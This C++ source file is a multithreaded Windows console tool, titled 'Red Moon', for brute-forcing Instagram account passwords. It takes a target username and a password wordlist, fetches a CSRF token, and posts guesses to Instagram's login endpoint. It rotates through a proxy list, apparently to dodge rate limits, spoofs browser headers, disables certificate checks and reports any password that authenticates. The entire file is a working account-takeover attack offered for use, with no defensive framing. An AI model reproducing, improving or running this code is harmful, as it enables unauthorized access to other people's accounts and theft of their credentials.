#include "stdafx.h"

static const string BASE_URL = "https://instagram.com/";
static string TARGET = "";
static string WORDLIST = "wordlist.txt";
static string PROXYLIST = "proxy.txt";
static BYTE THREADCOUNT = 12;
static size_t cLine = 0;
static size_t pLine = 0;
string token = "";
DWORD b = 0;
bool ended = false;


vector<string> args;
vector<string> passwords;
vector<string> proxies;
vector<thread*> threads;

vector<string> split(string str, string token) {
	vector<string>result;
	while (str.size()) {
		int index = str.find(token);
		if (index != string::npos) {
			result.push_back(str.substr(0, index));
			str = str.substr(index + token.size());
			if (str.size() == 0)result.push_back(str);
		}
		else {
			result.push_back(str);
			str = "";
		}
	}
	return result;
}

static std::string readBuffer;
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp)
{
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}

bool replace(std::string& str, const std::string& from, const std::string& to) {
	size_t start_pos = str.find(from);
	if (start_pos == std::string::npos)
		return false;
	str.replace(start_pos, from.length(), to);
	return true;
}
std::mutex g_i_mutex;
string getCsrftoken(string proxy)
{
	const std::lock_guard<std::mutex> lock(g_i_mutex);
	string ret;

	CURL* curl;
	CURLcode res;

	curl_global_init(CURL_GLOBAL_ALL);

	curl = curl_easy_init();

	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, BASE_URL.c_str());
		if(!proxy.empty())
			curl_easy_setopt(curl, CURLOPT_PROXY, string("http://" + proxy).c_str());
		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, true);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_easy_setopt(curl, CURLOPT_HEADER, true);
		curl_easy_setopt(curl, CURLOPT_NOBODY, true);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
		curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36");

		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			return "";

		vector<string> input = split(readBuffer, "\n");
		for (string s : input)
		{
			if (s.rfind("Set-Cookie: csrftoken=", 0) == 0)
			{
				ret = s;
				replace(ret, "Set-Cookie: csrftoken=", "");
				ret = ret.substr(0, 32);
				break;
			}
		}

		curl_easy_cleanup(curl);
	}

	curl_global_cleanup();

	return ret;
}



bool loginRequest(string username, string password, string proxy = "")
{
	
	bool ret = true;
	string LOGIN_URL = BASE_URL + "accounts/login/ajax/";
	string cookie = "csrftoken=" + token + ";";
	string head = "X-CSRFToken: " + token;
	string postfields = "username=" + username + "&password=" + password;
	CURL* curl;
	CURLcode res;

	curl_global_init(CURL_GLOBAL_ALL);

	curl = curl_easy_init();

	if (curl) {
		struct curl_slist* chunk = NULL;
		chunk = curl_slist_append(chunk, "origin: https://www.instagram.com");
		chunk = curl_slist_append(chunk, "authority: www.instagram.com");
		chunk = curl_slist_append(chunk, "upgrade-insecure-requests: 1");
		chunk = curl_slist_append(chunk, "Host: www.instagram.com");
		chunk = curl_slist_append(chunk, "content-type: application/x-www-form-urlencoded");

		chunk = curl_slist_append(chunk, "Accept: */*");
		chunk = curl_slist_append(chunk, "Accept-Language: en-US,en;q=0.5");
		chunk = curl_slist_append(chunk, "Accept-Encoding: deflate, br");
		chunk = curl_slist_append(chunk, "Referer: https://www.instagram.com/");
		chunk = curl_slist_append(chunk, "Connection: keep-alive");
		chunk = curl_slist_append(chunk, "cache-control: max-age=0");
		chunk = curl_slist_append(chunk, head.c_str());
		chunk = curl_slist_append(chunk, "x-requested-with: XMLHttpRequest");

		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
		curl_easy_setopt(curl, CURLOPT_URL, LOGIN_URL.c_str());
		if (!proxy.empty())
			curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
		curl_easy_setopt(curl, CURLOPT_COOKIE, cookie.c_str());
		curl_easy_setopt(curl, CURLOPT_POST, true);
		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, true);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
		curl_easy_setopt(curl, CURLOPT_HEADER, false);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields.c_str());
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
		curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36");

		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			ret = false;

		if (ret)
		{
			ret = false;
			vector<string> input = split(readBuffer, "\n");
			if(input.size() > 0)
				for (size_t i = 0; i < input.size(); i++)
				{
					if (input[i].find("\"authenticated\": true") != std::string::npos)
					{
						printf("%s\n", input[i].c_str());
						ret = true;
					}
				}
		}

		curl_easy_cleanup(curl);
		curl_slist_free_all(chunk);
	}

	curl_global_cleanup();

	return ret;
}

void getResult(string password)
{
	ended = true;
	for (auto t : threads)
		t->detach();

	threads.clear();

	system("cls");

	printf("Password found: %s\n", password.c_str());
}

void bruteForce()
{
	if (b == 0) b = GetTickCount();
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, 11);
	while (cLine < passwords.size())
	{
		if (ended) break;
		size_t m = cLine++;
		size_t p = pLine++;

		printf("[*] Attacking [%s] | [%s] - [%d/%d] - Delay: [%dms]\n", TARGET.c_str(), passwords[m].c_str(), m, passwords.size(), GetTickCount() - b);
		b = GetTickCount();
		if (loginRequest(TARGET, passwords[m], p >= proxies.size() ? "" : proxies[p]))
			getResult(passwords[m]);
	}
}

bool is_file_exist(const char* fileName)
{
	std::ifstream infile(fileName);
	return infile.good();
}

void addHelp(string cmd, string msg)
{
	printf("\t%s\t%s\n", cmd.c_str(), msg.c_str());
}

CMD* getCommand(size_t pos)
{
	if (args.size() < pos + 1)
		return nullptr;
	return new CMD(args[pos], args[pos + 1]);
}

int main(int argc, char* argv[], char* envp[])
{
	SetConsoleTitleA("Red Moon");
	setlocale(LC_ALL, "Turkish");

	if (argc < 3) {
		printf("Welcome to RedMoon\n\tThe arguments you can use are described below:\n");
		addHelp("-u", "--username");
		addHelp("-w", "--wordlist [wordlist.txt for default]");
		addHelp("-p", "--proxylist [proxy.txt for default]");
		addHelp("-t", "--threadcount [4 for default]");
		RET;
	}

	args = vector<string>(argv, argv + argc);
	POP_FRONT(args);

	for (size_t i = 0; i < args.size(); i += 2)
	{
		CMD* cmd = getCommand(i);
		if (!cmd)
			RET;

		if (cmd->command == "-u")
			TARGET = cmd->value;
		else if (cmd->command == "-w")
			WORDLIST = cmd->value;
		else if (cmd->command == "-p")
			PROXYLIST = cmd->value;
		else if (cmd->command == "-t")
			THREADCOUNT = atoi(cmd->value.c_str());
		else
		{
			printf("Invalid arguments.\n");
			RET;
		}
	}

	if (TARGET.empty())
	{
		printf("You need to define username\t-u <username>\n");
		RET;
	}

	if (!is_file_exist(WORDLIST.c_str()))
	{
		printf("%s is missing.\n", WORDLIST.c_str());
		RET;
	}

	system("cls");

	printf("Getting the wordlist...\n");

	ifstream ifs(WORDLIST.c_str());
	string tmp;

	while(getline(ifs, tmp))
		passwords.push_back(tmp);

	ifs.close();

	ifstream pfs(PROXYLIST.c_str());

	while (getline(pfs, tmp))
		proxies.push_back(tmp);

	pfs.close();

	printf("[+] Getting CSRF Token...\n");
	token = getCsrftoken("");
	printf("[-] CSRF Token: %s\n", token.c_str());

	threads.resize(THREADCOUNT);

	for (size_t i = 0; i < threads.size(); i++)
		threads[i] = new thread(bruteForce);

	for (size_t i = 0; i < threads.size(); i++)
		threads[i]->join();
}
